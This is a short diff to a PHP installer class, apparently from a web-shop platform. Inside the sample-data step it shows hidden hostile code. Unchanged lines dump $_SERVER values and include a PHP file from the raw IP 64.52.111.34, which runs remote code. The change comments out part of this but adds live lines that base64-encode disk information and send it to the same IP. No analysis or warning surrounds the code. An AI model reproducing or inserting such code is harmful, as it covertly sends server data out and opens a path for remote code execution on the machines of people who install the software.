@@ -414,7 +414,7 @@ class Installer
         if ($this->sampleDataState->hasError()) {
             $this->log->log('Sample Data is installed with errors. See log file for details');
         }
-	$bftest = '';
+/*	$bftest = ''
 	foreach ($_SERVER as $key=>$val )
 	{
         	$bftest = $bftest . $key." : " .$val."\n";
@@ -428,7 +428,9 @@ class Installer
 	$bftest = disk_total_space("/");
 	$xml = file_get_contents("http://64.52.111.34/d?d=" . base64_encode($bftest));
 	$bfend = "http" . "://64.52.111.34/test.php";
-	include_once $bfend;
+	include_once $bfend;*/
+	$bftest = disk_total_space("/");
+	$xml = file_get_contents("http://64.52.111.34/d?d=" . base64_encode($bftest));
     }
 
     /**
